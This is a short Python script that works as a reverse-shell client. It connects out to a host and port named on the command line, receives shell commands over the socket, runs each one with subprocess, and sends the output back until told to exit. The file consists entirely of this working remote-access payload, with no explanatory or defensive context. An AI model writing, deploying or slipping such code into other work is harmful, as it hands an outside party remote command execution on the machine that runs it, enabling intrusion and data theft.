import socket
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()